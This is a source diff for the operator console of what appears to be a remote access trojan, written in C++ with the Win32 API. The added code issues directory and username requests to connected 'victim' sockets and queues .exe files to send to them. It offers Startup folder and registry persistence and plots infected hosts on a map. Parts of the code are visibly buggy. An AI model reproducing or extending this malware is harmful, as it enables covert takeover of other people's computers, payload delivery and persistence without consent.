@@ -5,6 +5,16 @@
 #include "sys.h"
 #include "wndfuncs.h"
 #include <set>
+#define MAX_DOTS 100
+
+typedef struct _DOT {
+    int dotX; // X coordinate of the dot
+    int dotY; // Y coordinate of the dot
+    int dotRadius; // radius of the dot
+} DOT;
+
+DOT dots[MAX_DOTS];
+int numDots = 0;
 
 #pragma warning(disable:28251)
 
@@ -181,6 +191,28 @@ void CloseConnection(void)
     WSACleanup();
 }
 
+std::wstring GetCurrentSocketFromVector()
+{
+    SOCKET selectedSocket = clientSockets[itemIndex];
+    auto it = std::find(clientSockets.begin(), clientSockets.end(), selectedSocket);
+    if (it != clientSockets.end())
+    {
+        LVITEM lvItem;
+        lvItem.mask = LVIF_TEXT;
+        lvItem.iItem = itemIndex;
+        lvItem.iSubItem = 0;
+        lvItem.pszText = const_cast<LPWSTR>(aCounter.c_str());
+        lvItem.cchTextMax = sizeof(aCounter);
+
+        ListView_GetItem(hwndList, &lvItem);
+
+
+        int socketIndex = std::distance(clientSockets.begin(), it);
+    }
+
+    return aCounter;
+}
+
 ATOM CreateColumn(HWND hwndLV, int iCol, int width, wchar_t table_txt[])
 {
     LVCOLUMN lvc;
@@ -213,7 +245,6 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 {
     int bytesRec;
     int client_fd;
-
     switch (msg)
     {
     case WM_SOCKET:
@@ -265,6 +296,19 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
                 else {
                     // handle error
                 }
+
+                DOT newDot;
+                
+                newDot.dotX = rand() % 500; // the X coordinate of the dot is a random number between 0 and 500
+                newDot.dotY = 450 + (rand() % (700 - 450 + 1)); // the Y coordinate of the dot
+                newDot.dotRadius = 5; // the radius of the dot
+
+                // Add the new dot to the dots array
+                dots[numDots] = newDot;
+                numDots++;
+
+                // Redraw the window to display the new dot
+                InvalidateRect(hwnd, NULL, TRUE);
 
                 //OS
                 std::wstring osVersion = getSysOpType();
@@ -356,7 +400,35 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
         OnCreate(hwnd,wParam,lParam);
         break;
 
+    case WM_PAINT:
+    {
+        PAINTSTRUCT ps;
+        hdcMap = BeginPaint(hwnd, &ps);
 
+        // Get the device context for the entire window
+        HDC hMemDC = CreateCompatibleDC(hdcMap);
+        SelectObject(hMemDC, hMap);
+
+        // Get the width and height of the BMP image
+        BITMAP bmp;
+        GetObject(hMap, sizeof(BITMAP), &bmp);
+
+        // Display the BMP map image
+        BitBlt(hdcMap, 30, 400, bmp.bmWidth, bmp.bmHeight, hMemDC, 0, 0, SRCCOPY);
+
+        for (int i = 0; i < numDots; i++) {
+            HBRUSH hBrushMap = CreateSolidBrush(RGB(255, 0, 0));
+            SelectObject(hdcMap, hBrushMap);
+            Ellipse(hdcMap, dots[i].dotX - dots[i].dotRadius, dots[i].dotY - dots[i].dotRadius, dots[i].dotX + dots[i].dotRadius, dots[i].dotY + dots[i].dotRadius);
+            DeleteObject(hBrushMap);
+        }
+
+        // Release the device context
+        DeleteDC(hMemDC);
+
+        EndPaint(hwnd, &ps);
+        break;
+    }
 
     case WM_CONTEXTMENU:
     {
@@ -568,8 +640,6 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
             mi.hbrBack = CreateSolidBrush(clrLightRed);
 
             SetMenuInfo(hFunMenu, &mi);
-
-            // Display the "Fun" sub-menu at the current cursor position
             GetCursorPos(&cursorPos);
             TrackPopupMenu(hFunMenu, TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_NONOTIFY, cursorPos.x, cursorPos.y, 0, hwnd, NULL);
 
@@ -612,14 +682,12 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
     return 0;
 };
 
-bool isDestroyed = false;
-
-
 LRESULT CALLBACK ClientFTPWndProc(HWND FtpHwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
 {
     ItemMenu dpItem;
     HANDLE hFile;
     int itemFileIndex = 0;
+    std::vector<std::wstring> fileNameStr;
 
     switch (uMsg)
     {
@@ -628,7 +696,7 @@ LRESULT CALLBACK ClientFTPWndProc(HWND FtpHwnd, UINT uMsg, WPARAM wParam, LPARAM
     {
         SOCKET selectedSocket = clientSockets[itemIndex];
         auto it = std::find(clientSockets.begin(), clientSockets.end(), selectedSocket);
-        //send(selectedSocket, "requestdirs", strlen("requestdirs"), 0);
+        send(selectedSocket, "requestdirs", strlen("requestdirs"), 0);
 
         hwndFileList = CreateWindowW(WC_LISTVIEW, L"",
             WS_VISIBLE | WS_BORDER | WS_CHILD | LVS_SINGLESEL | LVS_REPORT | LVS_EDITLABELS,
@@ -639,7 +707,7 @@ LRESULT CALLBACK ClientFTPWndProc(HWND FtpHwnd, UINT uMsg, WPARAM wParam, LPARAM
         {
             CreateColumn(hwndFileList, 25, 100, (wchar_t*)L"File");
             CreateColumn(hwndFileList, 25, 100, (wchar_t*)L"Path");
-            CreateItem(hwndFileList, (wchar_t*)L"hey");
+            CreateColumn(hwndFileList, 25, 100, (wchar_t*)L"Victim Path");
         }
 
         dpItem.GlobalButtons(FtpHwnd);
@@ -663,16 +731,17 @@ LRESULT CALLBACK ClientFTPWndProc(HWND FtpHwnd, UINT uMsg, WPARAM wParam, LPARAM
                 break;
             }
 
-            case 211:
+            case FTP_ADD_FILES:
             {
                 wchar_t filename[MAX_PATH];
+                const wchar_t* notAdded = L"Not Added";
 
                 OPENFILENAME ofn;
                 ZeroMemory(&filename, sizeof(filename));
                 ZeroMemory(&ofn, sizeof(ofn));
                 ofn.lStructSize = sizeof(ofn);
                 ofn.hwndOwner = NULL;
-                ofn.lpstrFilter = L"Text Files\0*.txt\0Any File\0*.*\0";
+                ofn.lpstrFilter = L"Text Files\0*.txt\0Exe Files\0*.exe\0Any File\0*.*\0\0";
                 ofn.lpstrFile = filename;
                 ofn.nMaxFile = MAX_PATH;
                 ofn.lpstrTitle = L"Select a File!";
@@ -682,8 +751,92 @@ LRESULT CALLBACK ClientFTPWndProc(HWND FtpHwnd, UINT uMsg, WPARAM wParam, LPARAM
                 {
                     wchar_t* fileTitle = PathFindFileName(filename);
                     CreateItem(hwndFileList, fileTitle);
+                    ListView_SetItemText(hwndFileList, 0, 0, fileTitle);
+                    fileNameStr.push_back(fileTitle);
                     ListView_SetItemText(hwndFileList, 0, 1, filename);
+                    ListView_SetItemText(hwndFileList, 0, 2, (LPWSTR)notAdded);
                 }
+
+                break;
+            }
+
+            case ITEM_DEFAULT_PATH:
+            {
+                POINT cursorPos;
+                GetCursorPos(&cursorPos);
+                ScreenToClient(FtpHwnd, &cursorPos);
+
+                LVHITTESTINFO hitTestInfo;
+                hitTestInfo.pt = cursorPos;
+
+                HMENU hDefPathMenu = CreatePopupMenu();
+
+                InsertMenu(hDefPathMenu, 0, MF_BYPOSITION, DEF_PATH_STARTUP, L"Startup [FOLDER]");
+                InsertMenu(hDefPathMenu, 1, MF_BYPOSITION, 311, L"Startup [REGISTRY]");
+
+                MENUINFO mi = { 0 };
+                mi.cbSize = sizeof(MENUINFO);
+                mi.fMask = MIM_BACKGROUND;
+                mi.hbrBack = CreateSolidBrush(clrLightRed);
+
+                SetMenuInfo(hDefPathMenu, &mi);
+                GetCursorPos(&cursorPos);
+                TrackPopupMenu(hDefPathMenu, TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_NONOTIFY, cursorPos.x-50, cursorPos.y-50, 0, FtpHwnd, NULL);
+                
+                // Clean up
+                DestroyMenu(hDefPathMenu);
+
+                break;
+            }
+
+            case DEF_PATH_STARTUP:
+            {
+                SOCKET selectedSocket = clientSockets[itemIndex];
+                auto it = std::find(clientSockets.begin(), clientSockets.end(), selectedSocket);
+                send(selectedSocket, "requsr", strlen("requsr"), 0);
+
+                Sleep(500);
+                TCHAR clientUsername[260 + 1];
+                memset(clientUsername, 0, sizeof(clientUsername));
+                DWORD usernameLen = 260 + 1;
+                std::string usernameStr(clientUsername, clientUsername + usernameLen);
+                int bytesReceived = 0;
+
+                while (bytesReceived < usernameLen) {
+                    int result = recv(selectedSocket, const_cast<char*>(usernameStr.c_str() + bytesReceived), usernameLen - bytesReceived, 0);
+                    if (result == SOCKET_ERROR) {
+                        // handle socket error
+                        break;
+                    }
+                    bytesReceived += result;
+                }
+
+                if (bytesReceived > 0) {
+                    // handle successful receive
+                    MessageBoxA(NULL, usernameStr.c_str(), "s", MB_OK);
+                    // Successfully received username
+                    /*
+                        Now process the username
+                        actually im an idiot
+                        FUCK JUST SEND THE FILE :(((
+                        CLIENT WILL PROCESS USERNAME I AM IDIOT
+                    */
+                }
+                
+                break;
+            }
+
+            case FTP_REMALL_FILES:
+            {
+                int iCount = ListView_GetItemCount(hwndFileList);
+
+                for (int items = 0; items < iCount; items++)
+                {
+                    int itemDel = 0;
+                    ListView_DeleteItem(hwndFileList, itemDel);
+                    itemDel = itemDel + items;
+                }
+                
 
                 break;
             }
@@ -697,7 +850,29 @@ LRESULT CALLBACK ClientFTPWndProc(HWND FtpHwnd, UINT uMsg, WPARAM wParam, LPARAM
 
     case WM_DESTROY:
     {
+        std::wstring currentLog = GetCurrentSocketFromVector();
+        std::wofstream fileOut(L"C:\\Users\\mineo\\Desktop\\rattemp\\" + currentLog + L".txt");
+        if (!fileNameStr.empty())
+        {
+            for (const auto& itn : fileNameStr)
+            {
+                fileOut << itn << std::endl;
+            }
+        }
+        else
+        {
+            fileOut << "Empty here!" << "\n";
+        }
+        
+        fileOut.close();
+
         DestroyWindow(hwndFTP);
+        break;
+    }
+
+    case WM_CLOSE:
+    {
+        SendMessage(FtpHwnd, WM_DESTROY, NULL, NULL);
         break;
     }
 
@@ -814,6 +989,7 @@ LRESULT CALLBACK ClientWndProc(HWND Chwnd, UINT uMsg, WPARAM wParam, LPARAM lPar
         break;
     }
 
+
     case WM_CLOSE:
     {
         DestroyWindow(hwndClient);
@@ -844,8 +1020,8 @@ int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     WndClientRegisterClass(hInstance);
     WndClientFTPRegisterClass(hInstance);
 
-    int wWidth = 1000;
-    int wHeight = 675;
+    int wWidth = 1300;
+    int wHeight = 780;
     hwnd = CreateWindowExW(
         WS_EX_CLIENTEDGE,
         g_szClassName,
